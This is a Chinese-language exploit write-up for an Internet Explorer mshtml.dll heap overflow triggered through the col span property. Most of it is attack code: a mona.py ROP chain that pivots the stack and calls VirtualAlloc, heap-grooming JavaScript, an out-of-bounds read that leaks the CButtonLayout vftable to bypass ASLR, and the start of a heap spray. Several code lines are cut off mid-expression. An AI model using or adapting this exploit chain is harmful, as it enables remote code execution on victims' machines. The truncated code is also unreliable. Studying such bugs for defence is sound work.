                    var heapobj = new Object();
                    // generated with mona.py (mshtml.dll v)
                        function rop_chain(mshtmlbase)
                        {
                            var arr = [
                            mshtmlbase + Number(0x00001031),
                            mshtmlbase + Number(0x00002c78),    // pop ebp; retn
                            mshtmlbase + Number(0x0001b4e3),    // xchg eax,esp; retn (pivot)
                            mshtmlbase + Number(0x00352c8b),    // pop eax; retn
                            mshtmlbase + Number(0x00001340),    // ptr to &VirtualAlloc() [IAT]
                            mshtmlbase + Number(0x00124ade),    // mov eax,[eax]; retn
                            mshtmlbase + Number(0x000af93e),    // xchg eax,esi; and al,0; xor eax,eax; retn
                            mshtmlbase + Number(0x00455a9c),    // pop ebp; retn
                            mshtmlbase + Number(0x00128b8d),    // & jmp esp
                            mshtmlbase + Number(0x00061436),    // pop ebx; retn
                            0x00000001,                       // 0x00000001-> ebx
                            mshtmlbase + Number(0x0052d8a3),    // pop edx; retn
                            0x00001000,                       // 0x00001000-> edx
                            mshtmlbase + Number(0x00003670),    // pop ecx; retn
                            0x00000040,                       // 0x00000040-> ecx
                            mshtmlbase + Number(0x001d263d),    // pop edi; retn
                            mshtmlbase + Number(0x000032ac),    // retn
                            mshtmlbase + Number(0x00352c9f),    // pop eax; retn
                            0x90909090,                       // nop
                            mshtmlbase + Number(0x0052e805),    // pushad; retn
                            0x90909090,
                            0x90909090,
                            0x90909090,
                            0x90909090,
                            0x90909090,
                                ];
                            return arr;
                            }
                    function d2u(dword)
                    {
                        var uni = String.fromCharCode(dword & 0xFFFF);
                        uni += String.fromCharCode(dword>>16);
                        return uni;
                    }
                    function tab2uni(heapobj, tab)
                    {
                        var uni = ""
                        for(var i=0;i
第一部分用以申请大量内存并填充字符内容进行堆布局：
                var leak_index = -1;
                var dap = "EEEE";
                while ( dap.length 
其于内存中分布情况(`BSTR 'E'` & `BSTR 'A'` & `BSTR 'B'` & `CButtonLayout`)：
调用`CollectGarbage()`回收完成后，其`Len`部分变为`0x0000ffff`：
第二部分创建大量`col`标签，以占位之前释放堆块：
            &nbsp 
            &nbsp 
            ...
            &nbsp 
之后通过
        var obj_col = document.getElementById("132");
        obj_col.span = 19;
完成第一次溢出(可通过条件断点`bp 638209A2 ".if(eax==0x13){};.else{gc;}"`断下后再进一步分析)：
而写入位置在每次写入过后会加`0x1C`：
`0x1C`*`0x12`=`0x1F8`(`0x6368CD4B`处是`jl`命令)，`[EBX+9Ch]+0x1F8+0x18`位置恰为`BSTR
'B'`长度：
之后遍历`arr`数组，长度大于`(0x100-6)/2`元素即为发生溢出位置：
    for ( var i = 0; i  (0x100-6)/2 ) 
      { // overflowed
        leak_index = i;
由于该元素长度已被更改为`0x10048`，那么可以越界读取其后`CButtonLayout`中内容：
    var leak = arr[i].substring((0x100-6)/2+(2+8)/2, (0x100-6)/2+(2+8+4)/2);        //0xAE086377——금捷(Unicode)
转换成十六进制数，减去`CButtonLayout::vftable`相较于基址偏移便得到基址：
    leak_addr = parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 );
    mshtmlbase = leak_addr - Number(0x001582b8);
Exp中偏移与笔者环境中所计算偏移不符：
构造ROP+Shellcode及进行Heap Spray：
                function heap_spray()
                {
                       CollectGarbage();